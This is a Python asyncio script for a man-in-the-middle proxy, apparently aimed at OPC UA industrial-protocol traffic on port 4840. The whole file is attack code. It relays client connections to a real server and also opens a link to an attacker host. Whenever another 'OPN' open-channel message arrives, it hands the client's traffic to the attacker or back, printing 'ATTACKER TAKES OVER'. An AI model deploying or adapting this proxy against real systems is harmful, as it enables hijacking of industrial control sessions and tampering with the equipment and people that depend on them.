import asyncio
import datetime

PROXY_IP = "0.0.0.0"
PROXY_PORT = 4840

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4841

ATTACKER_HOST = "0.0.0.0"
ATTACKER_PORT = 4842

BUFFER = 8192

server_streams = ()
attacker_streams = ()

def log(msg):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

# Client requests can be switched between the legitimate server and the attacker
async def client_to_server(client, server, attacker):
    # Switch variables
    open_req = 0
    next_switch = attacker_streams

    direction = "C→S"
    try:
        while True:
            data = await client.read(BUFFER)

            if not data:
                break
            
            await asyncio.sleep(1)
            # If message is an OPN message, then increment the count
            if data[0:3] == b"OPN":
                open_req += 1
                # If it's not the 1st OPN, then switch paths
                if open_req > 1:
                    server = next_switch[1]
                    if next_switch == attacker_streams:
                        print("ATTACKER TAKES OVER")
                        direction = "A→S"
                        next_switch = server_streams
                    else:
                        print("BACK TO SERVER")
                        direction = "C→S"
                        next_switch = attacker_streams
            print(f"MSG from Client with header {data[0:3]}. Direction: {direction}")

            server.write(data)
            await server.drain()
    
    except Exception as e:
        log(f"Error in client to server.")
    finally:
        server.close()
        attacker.close()

# Server messages get sent to client
async def server_to_client(client, server):
        direction = "S→C"
        try:
            while True:
                data = await server.read(BUFFER)

                if not data:
                    break
                
                print(f"MSG from Client with header {data[0:3]}. Direction: {direction}")
                await asyncio.sleep(1)
                if direction == "d":
                    continue

                client.write(data)
                await client.drain()
        except Exception as e:
            log(f"Error in server to client.")
        finally:
            client.close()

# Attacker messages get sent to client
async def attacker_to_client(client, attacker):
        direction = "A→C"
        try:
            while True:
                data = await attacker.read(BUFFER)

                if not data:
                    break
                
                print(f"MSG from Client with header {data[0:3]}. Direction: {direction}")
                await asyncio.sleep(1)
                #input(f"MSG from Attacker with header: {data[0:3]}. Continue?")

                client.write(data)
                await client.drain()
        except Exception as e:
            log(f"Error in attacker to client.")
        finally:
            client.close()

# Called for each incoming client
async def handle_client(client_reader, client_writer):
    global server_streams
    global attacker_streams

    client_ip, client_port = client_writer.get_extra_info("peername")
    local_ip, local_port = client_writer.get_extra_info("sockname")

    log(f"Client connected from {client_ip}:{client_port} "
        f"→ proxy {local_ip}:{local_port}")

    # Create connection with the actual server
    try:
        server_reader, server_writer = await asyncio.open_connection(
            SERVER_HOST, SERVER_PORT
        )
    except Exception as e:
        log(f"Failed to connect to server {SERVER_HOST}:{SERVER_PORT}: {e}")
        client_writer.close()
        return
    server_streams = (server_reader, server_writer)
    log(f"Connected to real server {SERVER_HOST}:{SERVER_PORT}")

    # Create connection with the attacker server
    try:
        attacker_reader, attacker_writer = await asyncio.open_connection(
            ATTACKER_HOST, ATTACKER_PORT
        )
    except Exception as e:
        log(f"Failed to connect to server {ATTACKER_HOST}:{ATTACKER_PORT}: {e}")
        client_writer.close()
        return
    attacker_streams = (attacker_reader, attacker_writer)
    log(f"Connected to attacker {ATTACKER_HOST}:{ATTACKER_PORT}")

    # Creates the pipes for each side of the connection
    await asyncio.gather(
        client_to_server(client_reader, server_writer, attacker_writer),
        server_to_client(client_writer, server_reader),
        attacker_to_client(client_writer, attacker_reader)
    )

    log(f"Connection closed from {client_ip}:{client_port}")

async def main():
    # Create the listening server
    server = await asyncio.start_server(
        handle_client, PROXY_IP, PROXY_PORT
    )

    log(f"MITM proxy listening on {PROXY_IP}:{PROXY_PORT}, "
        f"forwarding to Server at {SERVER_HOST}:{SERVER_PORT} and to Attacker at {ATTACKER_HOST}:{ATTACKER_PORT}")

    async with server:
        await server.serve_forever()

asyncio.run(main())